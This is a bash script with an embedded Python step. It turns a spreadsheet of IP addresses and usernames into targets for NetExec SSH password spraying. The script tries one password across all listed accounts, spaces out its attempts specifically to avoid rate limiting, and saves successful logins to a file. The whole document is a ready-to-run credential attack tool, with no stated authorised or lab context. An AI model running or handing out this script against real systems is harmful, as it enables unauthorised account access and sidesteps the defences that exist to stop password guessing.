#!/bin/bash

# Excel to Targeted NetExec Scanner
# Converts Excel IP/User columns to optimized scanning
# Prevents SSH service overload by testing users per IP sequentially

EXCEL_FILE="$1"
PASSWORD="$2"
OUTPUT_FORMAT="ip_users.txt"
LOG_FILE="targeted_scan_$(date +%Y%m%d_%H%M%S).log"
SUCCESS_FILE="successful_logins_$(date +%Y%m%d_%H%M%S).txt"

# NetExec settings - Conservative to avoid SSH overload
THREADS=100          # Default NetExec threads (tests different IPs)
TIMEOUT=6            # Default NetExec timeout
MAX_USERS_PER_BATCH=5  # Split users into small batches per IP

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}=== Excel to Targeted NetExec Scanner ===${NC}"
echo ""

# Check arguments
if [ -z "$EXCEL_FILE" ] || [ -z "$PASSWORD" ]; then
    echo "Usage: $0 <excel_file.xlsx|csv> <password>"
    echo ""
    echo "Your Excel file should have:"
    echo "  Column A (header: IP): IP addresses"
    echo "  Column B (header: user): Usernames"
    echo ""
    echo "Example:"
    echo "  $0 user_list.xlsx 'Password123!'"
    echo "  $0 user_list.csv 'Password123!'"
    exit 1
fi

if [ ! -f "$EXCEL_FILE" ]; then
    echo -e "${RED}Error: File '$EXCEL_FILE' not found${NC}"
    exit 1
fi

# Check for required tools
check_dependencies() {
    local missing=""
    
    if ! command -v netexec &> /dev/null; then
        missing="${missing}netexec "
    fi
    
    # Check for Python and required libraries for Excel conversion
    if [[ "$EXCEL_FILE" == *.xlsx ]]; then
        if ! python3 -c "import openpyxl" 2>/dev/null; then
            missing="${missing}python3-openpyxl "
        fi
    fi
    
    if [ -n "$missing" ]; then
        echo -e "${RED}Missing dependencies: $missing${NC}"
        echo ""
        echo "Install with:"
        echo "  pip3 install openpyxl pandas"
        echo "  pip3 install netexec"
        exit 1
    fi
}

check_dependencies

echo -e "${YELLOW}Step 1: Converting Excel to IP:users format...${NC}"

# Python script to convert Excel to ip:users format
python3 - <<EOF "$EXCEL_FILE" "$OUTPUT_FORMAT"
import sys
import pandas as pd
from collections import defaultdict

excel_file = sys.argv[1]
output_file = sys.argv[2]

# Read Excel file (works for both .xlsx and .csv)
if excel_file.endswith('.csv'):
    df = pd.read_csv(excel_file)
else:
    df = pd.read_excel(excel_file)

# Normalize column names (case-insensitive)
df.columns = df.columns.str.strip().str.lower()

# Check for required columns
if 'ip' not in df.columns or 'user' not in df.columns:
    print(f"Error: Excel must have 'IP' and 'user' columns")
    print(f"Found columns: {', '.join(df.columns)}")
    sys.exit(1)

# Group users by IP
ip_users = defaultdict(list)
for _, row in df.iterrows():
    ip = str(row['ip']).strip()
    user = str(row['user']).strip()
    
    # Skip empty rows
    if ip and user and ip != 'nan' and user != 'nan':
        if user not in ip_users[ip]:  # Avoid duplicates
            ip_users[ip].append(user)

# Write to output file in ip:user1,user2,user3 format
with open(output_file, 'w') as f:
    for ip in sorted(ip_users.keys()):
        users = ','.join(ip_users[ip])
        f.write(f"{ip}:{users}\n")

# Print statistics
total_ips = len(ip_users)
total_users = sum(len(users) for users in ip_users.values())
avg_users = total_users / total_ips if total_ips > 0 else 0

print(f"Converted successfully:")
print(f"  Total unique IPs: {total_ips}")
print(f"  Total user entries: {total_users}")
print(f"  Average users per IP: {avg_users:.1f}")
EOF

if [ $? -ne 0 ]; then
    echo -e "${RED}Error converting Excel file${NC}"
    exit 1
fi

echo ""

# Read statistics
total_ips=$(wc -l < "$OUTPUT_FORMAT")
echo -e "${GREEN}✓ Conversion complete${NC}"
echo -e "  Output file: $OUTPUT_FORMAT"
echo -e "  Total IPs: $total_ips"
echo ""

# Show sample
echo -e "${YELLOW}Sample of converted data:${NC}"
head -3 "$OUTPUT_FORMAT"
echo ""

read -p "Continue with scan? (y/n): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "Scan cancelled. Converted data saved to: $OUTPUT_FORMAT"
    exit 0
fi

echo ""
echo -e "${BLUE}Step 2: Starting targeted scan...${NC}"
echo -e "${YELLOW}Settings:${NC}"
echo "  Strategy: Sequential per-IP scanning (prevents SSH overload)"
echo "  Threads: $THREADS (across different IPs)"
echo "  Timeout: ${TIMEOUT}s"
echo "  Max users per batch: $MAX_USERS_PER_BATCH"
echo ""

# Initialize logs
echo "=== Targeted Scan Started: $(date) ===" | tee "$LOG_FILE"
echo "Settings: Threads=$THREADS, Timeout=$TIMEOUT" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

total_tested=0
total_successes=0

# Process each IP with its users
while IFS=':' read -r ip users_csv; do
    total_tested=$((total_tested + 1))
    
    # Convert comma-separated users to array
    IFS=',' read -ra user_array <<< "$users_csv"
    user_count=${#user_array[@]}
    
    echo -e "${BLUE}[$total_tested/$total_ips] Testing $ip (${user_count} users)${NC}" | tee -a "$LOG_FILE"
    
    # Split users into small batches to avoid overwhelming SSH
    for ((i=0; i<${#user_array[@]}; i+=MAX_USERS_PER_BATCH)); do
        batch=("${user_array[@]:i:MAX_USERS_PER_BATCH}")
        batch_size=${#batch[@]}
        batch_num=$((i/MAX_USERS_PER_BATCH + 1))
        total_batches=$(( (user_count + MAX_USERS_PER_BATCH - 1) / MAX_USERS_PER_BATCH ))
        
        if [ $total_batches -gt 1 ]; then
            echo "  Batch $batch_num/$total_batches: ${batch[*]}" | tee -a "$LOG_FILE"
        fi
        
        # Create temp user file for this batch
        temp_users=$(mktemp)
        printf "%s\n" "${batch[@]}" > "$temp_users"
        
        # Run NetExec for this batch
        netexec ssh "$ip" -u "$temp_users" -p "$PASSWORD" \
            --threads 1 \
            --timeout $TIMEOUT \
            --continue-on-success \
            2>&1 | tee -a "$LOG_FILE" | grep --line-buffered "\[+\]"
        
        # Small delay between batches on same IP to avoid rate limiting
        if [ $batch_num -lt $total_batches ]; then
            sleep 2
        fi
        
        rm -f "$temp_users"
    done
    
    # Count successes for this IP
    ip_successes=$(grep "\[+\].*$ip" "$LOG_FILE" | tail -n $user_count | grep -c "\[+\]" || echo "0")
    total_successes=$((total_successes + ip_successes))
    
    if [ "$ip_successes" -gt 0 ]; then
        echo -e "${GREEN}  ✓ $ip: $ip_successes/$user_count successful${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${RED}  ✗ $ip: 0/$user_count successful${NC}" | tee -a "$LOG_FILE"
    fi
    
    echo "" | tee -a "$LOG_FILE"
    
done < "$OUTPUT_FORMAT"

# Final summary
echo "=== Scan Complete: $(date) ===" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}Results Summary:${NC}" | tee -a "$LOG_FILE"
echo "  IPs tested: $total_tested" | tee -a "$LOG_FILE"
echo "  Successful logins: $total_successes" | tee -a "$LOG_FILE"

if [ "$total_successes" -gt 0 ]; then
    # Extract all successful logins
    grep "\[+\]" "$LOG_FILE" | grep "SSH" > "$SUCCESS_FILE"
    
    echo "" | tee -a "$LOG_FILE"
    echo -e "${GREEN}Successful Logins:${NC}" | tee -a "$LOG_FILE"
    cat "$SUCCESS_FILE" | tee -a "$LOG_FILE"
    
    echo ""
    echo -e "${GREEN}✓ Success file created: $SUCCESS_FILE${NC}"
fi

echo ""
echo "Full log: $LOG_FILE"
echo "Converted data: $OUTPUT_FORMAT"
